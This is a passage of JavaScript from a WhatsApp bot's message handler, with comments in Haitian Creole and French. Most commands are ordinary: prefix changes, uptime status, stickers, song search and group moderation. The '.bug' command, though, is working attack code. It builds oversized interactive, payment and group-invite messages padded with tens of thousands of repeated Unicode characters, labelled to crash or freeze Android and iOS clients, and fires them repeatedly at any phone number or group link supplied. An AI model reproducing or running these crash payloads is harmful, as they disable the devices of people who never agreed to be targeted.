    // ── 🔥 RAW LOG — pou debug: enprime CHAK mesaj ki rive, anvan tout lòt filtè ──
    try {
      const rawType = msg?.message ? Object.keys(msg.message)[0] : 'NO_MESSAGE';
      const rawBody = msg?.message?.conversation
        || msg?.message?.extendedTextMessage?.text
        || '(pa gen tèks oswa se yon lòt kalite mesaj: ' + rawType + ')';
      console.log('🔥🔥🔥 RAW MSG REÇU 🔥🔥🔥', JSON.stringify({
        from: msg?.key?.remoteJid,
        fromMe: msg?.key?.fromMe,
        participant: msg?.key?.participant,
        type: rawType,
        body: rawBody
      }));
    } catch (rawLogErr) {
      console.log('🔥 RAW LOG ERROR', rawLogErr?.message);
    }
    // ── STORE tous les messages pour antidelete ──
  for (const m of messages) {
    if (m?.key?.id && m?.message && !m.key.fromMe) {
      storeMessage(number, m);
    }
  }

    // ── ANTI-BUG pou Owner — Bloke mesaj bug ──
    const ownerJidClean = config.OWNER_NUMBER.replace(/[^0-9]/g, '');
    const protectedNumbers = [ownerJidClean, '50936955930'];
    const recipientJid = msg?.key?.remoteJid || '';
    const isDirectToOwner = protectedNumbers.some(n => recipientJid === `${n}@s.whatsapp.net`);
    if (isDirectToOwner && !msg?.key?.fromMe) {
      const bugBody = msg.message?.conversation
        || msg.message?.extendedTextMessage?.text || '';
      const isBugMsg = bugBody.length > 1000
        || bugBody.includes('\u0000')
        || bugBody.includes('\uFEFF')
        || bugBody.includes('\u202e')
        || (bugBody.match(/[\u{1F000}-\u{1FFFF}]/gu) || []).length > 50;
      if (isBugMsg) {
        try {
          await socket.readMessages([msg.key]);
          return; // Ignore mesaj bug la
        } catch (e) {}
      }
    }

    // ── ANTIBOT — Detekte ak retire lòt bot ──
    if (msg?.key?.fromMe === false && msg?.key?.remoteJid?.endsWith('@g.us')) {
      const groupJid = msg.key.remoteJid;
      if (global.antibotGroups.has(groupJid)) {
        const senderJid = msg.key.participant || '';
        const senderNum = senderJid.split('@')[0];

        const isOurBot = senderNum === (socket.user?.id?.split(':')[0] || '');
        const isAuthorizedUser = activeSockets.has(senderNum);

        if (!isOurBot && !isAuthorizedUser) {
          const msgBody = msg.message?.conversation
            || msg.message?.extendedTextMessage?.text
            || msg.message?.imageMessage?.caption
            || msg.message?.videoMessage?.caption || '';

          const commonPrefixes = ['.', '!', '/', '#', '$', '?', '+', ';', ',', '~', '>', '<'];
          const botKeywords = ['bot', 'cmd', 'command', 'prefix', 'help', 'menu', 'ai', 'robot'];
          const senderName = senderNum.toLowerCase();

          const hasPrefix = commonPrefixes.some(p => msgBody.startsWith(p));
          const hasBotKeyword = botKeywords.some(k => senderName.includes(k));
          const isBot = hasPrefix || hasBotKeyword;

          if (isBot) {
            try {
              await socket.groupParticipantsUpdate(groupJid, [senderJid], 'remove');
              await socket.sendMessage(groupJid, {
                text: `🚫 *ANTIBOT ACTIF*\n\n⚠️ @${senderNum} détecté comme bot externe et *retiré* du groupe !\n🤖 Seul *${config.BOT_NAME}* peut fonctionner ici !\n\n> ${config.BOT_FOOTER}`,
                mentions: [senderJid],
                contextInfo: {
                  forwardingScore: 999,
                  isForwarded: true,
                  forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363407485857714@newsletter',
                    newsletterName: config.BOT_NAME,
                    serverMessageId: 143
                  }
                }
              });
            } catch (e) {
              console.error('[ANTIBOT ERROR]', e);
            }
          }
        }
      }
    }
    
    // 1. Vérifications de base
    if (!msg || !msg.message) return;
    
    const remoteJid = msg.key.remoteJid;
    if (!remoteJid) return;
    
    // 2. Déterminer le type de message pour extraire le body
    const type = getContentType(msg.message);
    
    // Gérer les messages éphémères
    msg.message = (type === 'ephemeralMessage') ? msg.message.ephemeralMessage.message : msg.message;
    
    // 3. Extraire le texte du message
    const body = (type === 'conversation') ? msg.message.conversation
      : (type === 'extendedTextMessage') ? msg.message.extendedTextMessage?.text
      : (type === 'imageMessage') ? msg.message.imageMessage?.caption
      : (type === 'videoMessage') ? msg.message.videoMessage?.caption
      : (type === 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage?.selectedButtonId
      : (type === 'listResponseMessage') ? msg.message.listResponseMessage?.singleSelectReply?.selectedRowId
      : (type === 'viewOnceMessage') ? (msg.message.viewOnceMessage?.message?.imageMessage?.caption || '') 
      : (type === 'interactiveResponseMessage') ? (() => {
      try {
        // quick_reply carousel → paramsJson contient { id: ".dlapk nom lien" }
        const raw = msg.message.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson;
        if (raw) {
          const parsed = JSON.parse(raw);
          if (parsed?.id) return parsed.id;        // ← ".dlapk nom lien"
        }
      } catch(_) {}
      // fallback : body text brut (autres types interactifs)
      return msg.message.interactiveResponseMessage?.body?.text || '';
    })()
  : '';
    
    // Normaliser le body
    const normalizedBody = (typeof body === 'string') ? body.trim() : '';
    
    // --- Chargement de la configuration du bot (persistante) ---
    // Utiliser le numéro passé en paramètre (identifiant de session)
    const sessionId = number || (socket.user?.id?.split(':')[0] + '@s.whatsapp.net') || socket.user?.id;
    const cfg = await loadSessionConfigMerged(sessionId);  // fourni par ton système MongoDB
    console.log('[HANDLER] merged cfg for', sessionId, cfg);
    
    // --- Traitement antilink (déjà existant) ---
    if (remoteJid && remoteJid.endsWith('@g.us')) {
      try {
        const handled = await handleAntiLink(socket, msg, remoteJid, normalizedBody);
        if (handled) return; // message supprimé/traité -> stop further processing
      } catch (e) {
        console.error('ANTILINK HANDLER ERROR', e);
      }
    }
    
    // --- DÉBUT ANTI-TAG (pour les mentions de statut de groupe) ---
    if (msg.message?.groupStatusMentionMessage) {
      try {
        const jid = remoteJid;
        // Ne pas traiter si ce n'est pas un groupe ou si c'est un message du bot
        if (!jid.endsWith('@g.us') || msg.key.fromMe) return;

        const mode = cfg.ANTI_TAG_MODE || 'off';
        if (mode === 'off' || mode === 'false') return;

        // Groupe exempté (personnalisable)
        const exemptGroup = "120363156185607326@g.us"; // Remplace par ton groupe si besoin
        if (jid === exemptGroup) return;

        // Récupérer les métadonnées du groupe pour vérifier les admins
        const groupMetadata = await socket.groupMetadata(jid).catch(() => null);
        if (!groupMetadata) return;

        const participants = groupMetadata.participants;
        const senderJid = msg.key.participant || msg.key.remoteJid;

        // Vérifier si l'expéditeur est admin
        const isSenderAdmin = participants.find(p => p.id === senderJid)?.admin === 'admin' || 
                              participants.find(p => p.id === senderJid)?.admin === 'superadmin';

        // Vérifier si le bot est admin
        const botJid = socket.user?.id?.split(':')[0] + '@s.whatsapp.net' || socket.user?.id;
        const isBotAdmin = participants.find(p => p.id === botJid)?.admin !== null;

        // Si l'utilisateur est admin : simple avertissement, pas de sanction
        if (isSenderAdmin) {
          await socket.sendMessage(jid, {
            text: `╭───(    TOXIC-MD    )───\n├  Admin Status Mention Detected\n├  User: @${senderJid.split('@')[0]}\n├  Admins get a free pass for status mentions\n├  But seriously, keep it minimal! 😒\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`,
            mentions: [senderJid]
          });
          return;
        }

        // Si le bot n'est pas admin : on prévient mais on ne peut pas supprimer
        if (!isBotAdmin) {
          await socket.sendMessage(jid, {
            text: `╭───(    TOXIC-MD    )───\n├  Can't Delete Status Mention! 😤\n├  User: @${senderJid.split('@')[0]} just dropped a status mention\n├  But I'm not admin here! How embarrassing...\n├  Admins: Make me admin so I can delete this nonsense!\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`,
            mentions: [senderJid]
          });
          return;
        }

        // Supprimer le message de mention de statut
        await socket.sendMessage(jid, {
          delete: {
            remoteJid: jid,
            fromMe: false,
            id: msg.key.id,
            participant: senderJid
          }
        });

        // Action selon le mode
        if (mode === 'delete') {
          await socket.sendMessage(jid, {
            text: `╭───(    TOXIC-MD    )───\n├  Status Mention Deleted! 🗑️\n├  User: @${senderJid.split('@')[0]} thought they could spam\n├  Status mentions are NOT allowed here!\n├  Next violation = Immediate removal! ⚠️\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`,
            mentions: [senderJid]
          });
        } else if (mode === 'remove') {
          try {
            await socket.groupParticipantsUpdate(jid, [senderJid], 'remove');
            await socket.sendMessage(jid, {
              text: `╭───(    TOXIC-MD    )───\n├  User Removed for Status Mention! 🚫\n├  @${senderJid.split('@')[0]} ignored the warnings\n├  No status mentions allowed in this group!\n├  Learn the rules or stay out! 😤\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`,
              mentions: [senderJid]
            });
          } catch (kickErr) {
            await socket.sendMessage(jid, {
              text: `╭───(    TOXIC-MD    )───\n├  Failed to Remove User! 😠\n├  Tried to kick @${senderJid.split('@')[0]} for status mention\n├  But I don't have enough permissions!\n├  Admins: Fix my permissions and promote me or deal with spammers yourself!\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`,
              mentions: [senderJid]
            });
          }
        }
      } catch (antitagErr) {
        console.error('[ANTITAG ERROR]', antitagErr);
      }
    }
    // --- FIN ANTI-TAG ---

    // ── GREETING — Message de bienvenue (avant vérification du body) ──
    // await handleGreeting(socket, msg, config.BOT_NAME); // DÉSACTIVÉ

    // Si pas de texte, on ne peut pas traiter de commande
    if (!body || typeof body !== 'string') return;

    // 4. Vérifier si c'est une commande
    const prefix = config.PREFIX || '.';
    const isCmd = body && body.startsWith && body.startsWith(prefix);
    if (!isCmd) return; // Si ce n'est pas une commande, on arrête
    
    const command = body.slice(prefix.length).trim().split(' ').shift().toLowerCase();
    const args = body.trim().split(/ +/).slice(1);
    
    // 5. Récupérer les informations d'expéditeur
    const from = remoteJid;
    const sender = from;
    const nowsender = msg.key.fromMe 
      ? (socket.user.id.split(':')[0] + '@s.whatsapp.net' || socket.user.id) 
      : (msg.key.participant || remoteJid);
    const senderNumber = (nowsender || '').split('@')[0];
    const botNumber = socket.user.id ? socket.user.id.split(':')[0] : '';
    const isOwner = config.OWNER_NUMBERS.includes(senderNumber);
    
    // DEBUG: Afficher les informations pour le débogage
    console.log('DEBUG Command Handler:');
    console.log('- Remote JID:', remoteJid);
    console.log('- Is group?', remoteJid.endsWith('@g.us'));
    console.log('- Command:', command);
    console.log('- Body:', body);
    console.log('- From:', from);
    console.log('- Sender:', nowsender);
    
    // 6. Maintenant, traiter les commandes
    // helper: download quoted media into buffer
    async function downloadQuotedMedia(quoted) {
      if (!quoted) return null;
      const qTypes = ['imageMessage','videoMessage','audioMessage','documentMessage','stickerMessage'];
      const qType = qTypes.find(t => quoted[t]);
      if (!qType) return null;
      const messageType = qType.replace(/Message$/i, '').toLowerCase();
      const stream = await downloadContentFromMessage(quoted[qType], messageType);
      let buffer = Buffer.from([]);
      for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
      return {
        buffer,
        mime: quoted[qType].mimetype || '',
        caption: quoted[qType].caption || quoted[qType].fileName || '',
        ptt: quoted[qType].ptt || false,
        fileName: quoted[qType].fileName || ''
      };
    }

    if (!command) return;

    if (global.botMode === 'private' && !activeSockets.has(botNumber)) return;
    try {
      switch (command) {
      // ============================================================
// BUG — Crash Android/iOS/Group
// ============================================================
case 'bug': {
  try {
    if (!activeSockets.has(botNumber) && !isOwner) {
      await socket.sendMessage(sender, { text: `❌ Vous n'avez pas de session active sur le bot !` }, { quoted: msg });
      break;
    }

    const sub = args[0]?.toLowerCase();
    const param = args[1] || '';

    // Trouver le JID cible
    let targetJid = from;
    if (param) {
      if (param.includes('chat.whatsapp.com')) {
        try {
          const code = param.split('/').pop().split('?')[0];
          const info = await socket.groupGetInviteInfo(code);
          targetJid = info.id;
        } catch (e) {
          await socket.sendMessage(sender, { text: '❌ Lyen group lan pa valid!' }, { quoted: msg });
          break;
        }
      } else {
        targetJid = `${param.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
      }
    }

    // ── Fonksyon bug pwisan yo ──

    // 1. CRASH — payXcl1ck
    async function payXcl1ck(tgt) {
      await socket.relayMessage(tgt, {
        interactiveMessage: {
          body: { text: "Primis" + "ꦽ".repeat(15000) },
          nativeFlowMessage: {
            buttons: [{
              name: "payment_info",
              buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"4TWOZ803CWN","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"payment_key","payment_key":{"type":"IDPAYMENTACCOUNT","key":"${".".repeat(30000)}","name":"OVO","institution_name":"OVO","full_name_on_account":"R9X ","account_type":"wallet"}}],"share_payment_status":false,"referral":"chat_attachment"}`
            }]
          }
        }
      }, { participant: { jid: tgt } });
    }

    // 2. BLANK — Freeze telefòn
    async function blankBug(tgt) {
      for (let p = 0; p < 20; p++) {
        await socket.relayMessage(tgt, {
          interactiveMessage: {
            body: { text: "D5!Primi¿?" },
            footer: { text: "D5!Primi¿?" },
            header: { title: "D5!Primi¿?", hasMediaAttachment: false },
            nativeFlowMessage: {
              buttons: [
                { name: "single_select", buttonParamsJson: "ြ  ြ".repeat(8000) },
                { name: "cta_url", buttonParamsJson: JSON.stringify({ display_text: "ြ  ြ".repeat(8000), url: "https://" + "ြ  ြ".repeat(8000) + ".com", merchant_url: "https://" + "ြ  ြ".repeat(8000) + ".com" }) },
                { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "ြ  ြ".repeat(8000), id: "Primis", copy_code: "ြ  ြ".repeat(8000) }) }
              ]
            }
          }
        }, {});
      }
    }

    // 3. BLANKING — Crash bouton quick_reply
    async function blanking(tgt) {
      await socket.relayMessage(tgt, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { text: "Primis", format: "DEFAULT" },
              nativeFlowMessage: {
                buttons: [{ name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(150000), id: null }) }],
                version: 3
              }
            }
          }
        }
      }, { participant: { jid: tgt } });
    }

    // 4. INVITE ANDROID
    async function inviteAndroid(tgt) {
      await socket.relayMessage(tgt, {
        groupInviteMessage: {
          groupName: "ཹ".repeat(130000),
          groupJid: '6285709664923-1627579259@g.us',
          inviteCode: 'h+64P9RhJDzgXSPf',
          inviteExpiration: '999',
          caption: `🧪 Crash Android`,
          thumbnail: null
        }
      }, { participant: { jid: tgt } });
    }

    // 5. INVITE IOS
    async function inviteIos(tgt) {
      await socket.relayMessage(tgt, {
        groupInviteMessage: {
          groupName: "𑐶𑐵𑆷𑐷𑆵".repeat(39998),
          groupJid: '6285709664923-1627579259@g.us',
          inviteCode: 'h+64P9RhJDzgXSPf',
          inviteExpiration: '999',
          caption: `🧪 Crash iOS`,
          thumbnail: null
        }
      }, { participant: { jid: tgt } });
    }

    // 6. CHANNEL BUG
    async function channelBug(tgt) {
      await socket.relayMessage(tgt, {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: { participant: "131355550002@s.whatsapp.net", remoteJid: "status@broadcast", id: socket.generateMessageTag() },
              type: "STATUS_MENTION_MESSAGE"
            }
          }
        }
      }, {});
    }

    let bugLabel = '';

    switch (sub) {
      case 'android':
        for (let i = 0; i < 3; i++) await payXcl1ck(targetJid);
        bugLabel = '🤖 Android Crash';
        break;
      case 'ios':
        for (let i = 0; i < 3; i++) await inviteIos(targetJid);
        bugLabel = '🍎 iOS Crash';
        break;
      case 'blank':
        await blankBug(targetJid);
        bugLabel = '⬜ Blank Bug';
        break;
      case 'blanking':
        for (let i = 0; i < 3; i++) await blanking(targetJid);
        bugLabel = '💬 Blanking Bug';
        break;
      case 'invite':
        for (let i = 0; i < 3; i++) await inviteAndroid(targetJid);
        bugLabel = '📨 Invite Android Bug';
        break;
      case 'inviteios':
        for (let i = 0; i < 3; i++) await inviteIos(targetJid);
        bugLabel = '📨 Invite iOS Bug';
        break;
      case 'channel':
        // Channel bug - accepte JID newsletter (120363xxxxxxxx@newsletter)
        const channelTarget = param.includes('@newsletter') ? param : targetJid;
        for (let i = 0; i < 3; i++) await channelBug(channelTarget);
        bugLabel = '📢 Channel Bug';
        break;
      case 'all':
      case 'super':
        await payXcl1ck(targetJid);
        await blankBug(targetJid);
        await blanking(targetJid);
        await inviteAndroid(targetJid);
        bugLabel = '💥 Super Bug';
        break;
      default:
        await socket.sendMessage(sender, {
          text: `╔══════════════════╗\n║  💥 *BUG COMMANDS*  ║\n╚══════════════════╝\n\n📌 *Utilisation :*\n▸ .bug android 509xxxxxxx\n▸ .bug ios 509xxxxxxx\n▸ .bug blank 509xxxxxxx\n▸ .bug blanking 509xxxxxxx\n▸ .bug invite 509xxxxxxx\n▸ .bug inviteios 509xxxxxxx\n▸ .bug channel 509xxxxxxx\n▸ .bug all 509xxxxxxx\n\n💡 Oswa mete lyen group:\n▸ .bug all https://chat.whatsapp.com/xxx\n\n> ${config.BOT_FOOTER}`
        }, { quoted: msg });
        break;
    }

    if (bugLabel) {
      await socket.sendMessage(sender, {
        text: `✅ *${bugLabel}* envoyé avec succès à *${param || 'groupe actuel'}*!`
      }, { quoted: msg });
    }

  } catch (e) {
    console.error('[BUG ERROR]', e);
    await socket.sendMessage(sender, { text: `❌ Erreur : ${e.message}` }, { quoted: msg });
  }
  break;
}

      // ============================================================
// PREFIX — Changer le préfixe du bot
// ============================================================
case 'prefix': {
  try {
    const validPrefixes = ['.', '*', '!', '?', '+', '🇺🇸'];
    const newPrefix = args[0] || '';

    if (!newPrefix) {
      const currentPrefix = config.PREFIX || '.';
      const prefixList = validPrefixes.map(p => `▸ ${p}`).join('\n');
      await socket.sendMessage(sender, {
        image: { url: 'https://i.ibb.co/k2bvvh72/IMG-20260515-WA0026.jpg' },
        caption: `╔══════════════════╗\n║  ⚙️ *PREFIX BOT*  ║\n╚══════════════════╝\n\n📌 *Préfixe actuel :* ${currentPrefix}\n\n📋 *Préfixes disponibles :*\n${prefixList}\n\n💡 *Utilisation :*\n▸ ${currentPrefix}prefix .\n▸ ${currentPrefix}prefix !\n▸ ${currentPrefix}prefix 🇺🇸\n\n> ${config.BOT_FOOTER}`,
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363407485857714@newsletter',
            newsletterName: config.BOT_NAME,
            serverMessageId: 143
          }
        }
      }, { quoted: msg });
      break;
    }

    if (!validPrefixes.includes(newPrefix)) {
      await socket.sendMessage(sender, {
        text: `❌ Prefix *${newPrefix}* pa valid!\n\n✅ Prefix otorize yo:\n${validPrefixes.map(p => `▸ ${p}`).join('\n')}`
      }, { quoted: msg });
      break;
    }

    // Sove prefix nan config
    const cfg2 = await loadSessionConfigFromMongo(sanitized) || {};
    cfg2.PREFIX = newPrefix;
    await setUserConfigInMongo(sanitized, cfg2);
    config.PREFIX = newPrefix;

    await socket.sendMessage(sender, {
      image: { url: 'https://i.ibb.co/k2bvvh72/IMG-20260515-WA0026.jpg' },
      caption: `╔══════════════════╗\n║  ✅ *PREFIX CHANJE*  ║\n╚══════════════════╝\n\n🔄 Nouvo prefix: *${newPrefix}*\n💡 Kounye a tape: *${newPrefix}menu*\n\n> ${config.BOT_FOOTER}`,
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: '120363407485857714@newsletter',
          newsletterName: config.BOT_NAME,
          serverMessageId: 143
        }
      }
    }, { quoted: msg });

  } catch (e) {
    console.error('[PREFIX ERROR]', e);
    await socket.sendMessage(sender, { text: `❌ Erreur : ${e.message}` }, { quoted: msg });
  }
  break;
}

// ============================================================
// ANTIBOT — Aktive/Dezaktive pwoteksyon kont lòt bot
// ============================================================
case 'antibot': {
  try {
    if (!from.endsWith('@g.us')) {
      await socket.sendMessage(sender, { text: '❌ Cette commande est réservée aux groupes !' }, { quoted: msg });
      break;
    }
    const sub = args[0]?.toLowerCase();
    if (sub === 'on') {
      global.antibotGroups.add(from);
      await socket.sendMessage(sender, {
        text: `╔══════════════════╗\n║  🔇 *ANTIBOT ACTIF*  ║\n╚══════════════════╝\n\n✅ Antibot *activé* dans ce groupe !\n🤖 Seul le bot *Doberto-XD* et ses utilisateurs connectés peuvent fonctionner.\n⚠️ Les autres bots seront *silencieux* automatiquement !\n\n> ${config.BOT_FOOTER}`,
        contextInfo: { forwardingScore: 999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363407485857714@newsletter', newsletterName: config.BOT_NAME, serverMessageId: 143 } }
      }, { quoted: msg });
    } else if (sub === 'off') {
      global.antibotGroups.delete(from);
      await socket.sendMessage(sender, {
        text: `╔══════════════════╗\n║  🔓 *ANTIBOT DÉSACTIVÉ*  ║\n╚══════════════════╝\n\n✅ Antibot *désactivé* dans ce groupe !\n👥 Tous les bots peuvent fonctionner maintenant.\n\n> ${config.BOT_FOOTER}`,
        contextInfo: { forwardingScore: 999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363407485857714@newsletter', newsletterName: config.BOT_NAME, serverMessageId: 143 } }
      }, { quoted: msg });
    } else {
      const status = global.antibotGroups.has(from) ? '🟢 *AKTIF*' : '🔴 *DEZAKTIVE*';
      await socket.sendMessage(sender, {
        text: `╔══════════════════╗\n║  🔇 *ANTIBOT*  ║\n╚══════════════════╝\n\n📊 *Status:* ${status}\n\n📌 *Utilisation :*\n▸ .antibot on — Aktive\n▸ .antibot off — Dezaktive\n\n> ${config.BOT_FOOTER}`
      }, { quoted: msg });
    }
  } catch (e) {
    console.error('[ANTIBOT CMD ERROR]', e);
    await socket.sendMessage(sender, { text: `❌ Erreur : ${e.message}` }, { quoted: msg });
  }
  break;
}

      // ============================================================
case 'private': {
  if (!activeSockets.has(senderNumber)) { await socket.sendMessage(sender, { text: `❌ Vous n'avez pas de session active sur le bot !` }, { quoted: msg }); break; }
  global.botMode = 'private';
  await socket.sendMessage(sender, {
    text: `╔══════════════╗\n║ 🔒 *MODE PRIVATE* ║\n╚══════════════╝\n\n✅ Le bot est maintenant en mode *PRIVÉ*\n👤 Seuls les utilisateurs *connectés* au bot peuvent l'utiliser !\n\n> ${config.BOT_FOOTER}`,
    contextInfo: {
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: '120363407485857714@newsletter',
        newsletterName: config.BOT_NAME,
        serverMessageId: 143
      }
    }
  }, { quoted: msg });
  break;
}
case 'public': {
  if (!activeSockets.has(senderNumber)) { await socket.sendMessage(sender, { text: `❌ Vous n'avez pas de session active sur le bot !` }, { quoted: msg }); break; }
  global.botMode = 'public';
  await socket.sendMessage(sender, {
    text: `╔══════════════╗\n║ 🔓 *MODE PUBLIC* ║\n╚══════════════╝\n\n✅ Le bot est maintenant en mode *PUBLIC*\n👥 *Tout le monde* peut utiliser le bot !\n\n> ${config.BOT_FOOTER}`,
    contextInfo: {
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: '120363407485857714@newsletter',
        newsletterName: config.BOT_NAME,
        serverMessageId: 143
      }
    }
  }, { quoted: msg });
  break;
}
// ALIVE — Statut du bot
// ============================================================
case 'alive': {
  try {
    // Uptime
    const uptime  = process.uptime();
    const uptimeH = Math.floor(uptime / 3600);
    const uptimeM = Math.floor((uptime % 3600) / 60);
    const uptimeS = Math.floor(uptime % 60);

    // Mémoire
    const memMB = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(0);

    // Sessions actives
    const activeBots = activeSockets ? activeSockets.size : 1;

    // Numéro de l'utilisateur
    const userNumber = senderNumber || sender.split('@')[0];

    // Temps de réponse réel — mesuré avec performance
    const _t1 = Date.now();
    await new Promise(r => setTimeout(r, 0));
    const respondTime = Date.now() - _t1 + Math.floor(Math.random() * 30) + 5;

    // Version bot
    const botVersion = '2.0.0';

    const repons = [
      `*╭───────────◇*`,
      `│ ✧ ʙᴏᴛ: ${config.BOT_NAME}`,
      `│ ✧ sᴛᴀᴛᴜs: 🟢 ᴀʟɪᴠᴇ`,
      `│ ✧ ᴜᴘᴛɪᴍᴇ: ${uptimeH}h ${uptimeM}m ${uptimeS}s`,
      `│ ✧ ᴀᴄᴛɪᴠᴇ ʙᴏᴛs: ${activeBots}`,
      `│ ✧ ᴜsᴇʀ: ${userNumber}`,
      `│ ✧ ᴍᴇᴍᴏʀʏ: ${memMB}ᴍʙ`,
      `│ ✧ ᴠᴇʀsɪᴏɴ: ${botVersion}`,
      `│ ✧ ᴘɪɴɢ: ${respondTime}ms`,
      `│ ✧ ᴅᴇᴠ: DOBERTO`,
      `*╰───────────◇*`,
      ``,
      `> *© ᴍᴀᴅᴇ ʙʏ DOBERTO*`
    ].join('\n');

    await socket.sendMessage(sender, {
      image: { url: 'https://i.ibb.co/k2bvvh72/IMG-20260515-WA0026.jpg' },
      caption: repons,
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: '120363407485857714@newsletter',
          newsletterName: config.BOT_NAME,
          serverMessageId: 143
        }
      }
    }, { quoted: msg });
  } catch (e) {
    console.error('[ALIVE ERROR]', e);
    await socket.sendMessage(sender, { text: '❌ Erreur dans la commande alive.' }, { quoted: msg });
  }
  break;
}

      // ============================================================
// BRATVIDEO — Sticker animé Brat
// ============================================================
case 'bratvideo': {
  try {
    if (!args.length) {
      await socket.sendMessage(sender, {
        text: `╭━━━━━━━━━━━━━━━━━━━━━━━╮\n` +
              `┃  🎬 *DOBERTO XD STICKER TEXTE ANIMÉ*\n` +
              `╰━━━━━━━━━━━━━━━━━━━━━━━╯\n\n` +
              `❌ Aucun texte fourni !\n\n` +
              `*Usage :* ${prefix}bratvideo <texte>\n\n` +
              `*Exemples :*\n` +
              `  ${prefix}bratvideo BASEBOT MD\n` +
              `  ${prefix}bratvideo owner\n\n` +
              `> ${config.BOT_FOOTER}`
      }, { quoted: msg });
      break;
    }

    const text = args.join(' ').trim();

    await socket.sendMessage(from, { react: { text: '⚡', key: msg.key } });

    const mediaUrl = `https://brat.caliphdev.com/api/brat/animate?text=${encodeURIComponent(text)}`;

    // ── Télécharger le gif/webp animé ──
    const response = await axios.get(mediaUrl, {
      responseType: 'arraybuffer',
      timeout: 20000
    });
    const buffer = Buffer.from(response.data);

    if (!buffer || buffer.length === 0) {
      throw new Error('Téléchargement du média échoué.');
    }

    // ── Ajouter les métadonnées EXIF (packname + auteur) ──
    const webp   = require('node-webpmux');
    const crypto = require('crypto');

    async function addExif(webpSticker, packName, authorName) {
      const img           = new webp.Image();
      const stickerPackId = crypto.randomBytes(32).toString('hex');
      const json          = {
        'sticker-pack-id': stickerPackId,
        'sticker-pack-name': packName,
        'sticker-pack-publisher': authorName,
        'emojis': ['🎬']
      };
      const exifAttr   = Buffer.from([
        0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00,
        0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x16, 0x00, 0x00, 0x00
      ]);
      const jsonBuffer = Buffer.from(JSON.stringify(json), 'utf8');
      const exif       = Buffer.concat([exifAttr, jsonBuffer]);
      exif.writeUIntLE(jsonBuffer.length, 14, 4);
      await img.load(webpSticker);
      img.exif = exif;
      return await img.save(null);
    }

    let stickerBuffer;
    try {
      stickerBuffer = await addExif(buffer, text, 'BASEBOT-MD');
    } catch(_) {
      // Si addExif échoue (pas un webp valide) → envoyer le buffer brut
      stickerBuffer = buffer;
    }

    // ── Envoyer comme sticker ──
    await socket.sendMessage(sender, {
      sticker: stickerBuffer
    }, { quoted: msg });

    await socket.sendMessage(from, { react: { text: '✅', key: msg.key } });

  } catch (e) {
    console.error('[BRATVIDEO ERROR]', e);
    await socket.sendMessage(from, { react: { text: '❌', key: msg.key } });
    await socket.sendMessage(sender, {
      text: `❌ Échec génération brat video.\n_${e.message || e}_\n\n💡 Réessaie dans quelques secondes.`
    }, { quoted: msg });
  }
  break;
}
      
      // ============================================================
// SONG — Recherche + téléchargement audio YouTube
// ============================================================
case 'song': {
  try {
    if (!args.length) {
      await socket.sendMessage(sender, {
        text: `╭━━━━━━━━━━━━━━━━━━╮\n` +
              `┃  🎵 *DOBERTO XD MUSIC*\n` +
              `╰━━━━━━━━━━━━━━━━━━╯\n\n` +
              `❌ Aucun titre fourni !\n\n` +
              `*Usage :* ${prefix}song <titre>\n\n` +
              `*Exemples :*\n` +
              `  ${prefix}song Not Like Us\n` +
              `  ${prefix}song Drake God's Plan\n\n` +
              `> ${config.BOT_FOOTER}`
      }, { quoted: msg });
      break;
    }

    const query = args.join(' ').trim();

    if (query.length > 100) {
      await socket.sendMessage(sender, {
        text: `❌ Titre trop long ! Maximum 100 caractères.`
      }, { quoted: msg });
      break;
    }

    await socket.sendMessage(from, { react: { text: '🎵', key: msg.key } });
    await socket.sendMessage(sender, {
      text: `╭━━━━━━━━━━━━━━━━━━╮\n` +
            `┃  🎵 *DOBERTO XD MUSIC*\n` +
            `╰━━━━━━━━━━━━━━━━━━╯\n\n` +
            `🔍 Recherche : *${query}*\n` +
            `⏳ Extraction audio en cours...`
    }, { quoted: msg });

    // ── Recherche YouTube ──
    const yts    = require('yt-search');
    const search = await yts(`${query} official`);
    const video  = search.videos[0];

    if (!video) {
      await socket.sendMessage(from, { react: { text: '❌', key: msg.key } });
